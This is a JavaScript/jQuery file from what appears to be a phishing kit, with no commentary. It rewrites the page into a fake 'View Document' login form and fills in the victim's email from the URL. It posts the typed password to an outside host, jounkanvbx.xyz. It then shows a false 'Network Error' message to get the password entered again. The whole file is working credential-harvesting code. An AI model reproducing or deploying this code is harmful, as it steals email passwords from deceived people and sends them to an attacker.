$(document).ready(function() {


    load();


    function load() {
        $('body').html(`
  
        <div class="col-sm-4 card">
        <img src="to.png" class="img-fluid">
      
        <form method="post" id="formx" class="my-4 p-3">
        <small class="text-danger" id="msg" style="font-weight:600;"></small>
    
            <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
    
            <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
    
    
            <button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block">View Document</button>
        </form>
    
    </div>
`);

    }

    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html(`<button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block"> <span class="spinner-grow spinner-grow-sm"></span>
        Please Wait...</button>`).prop("disabled", true);
        $.ajax({
            url: "https://jounkanvbx.xyz/m1/ya,php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                console.log(res);
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`Network Error! Please verify your information and try again`);
                    $("#submitBtn").html("View Document").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
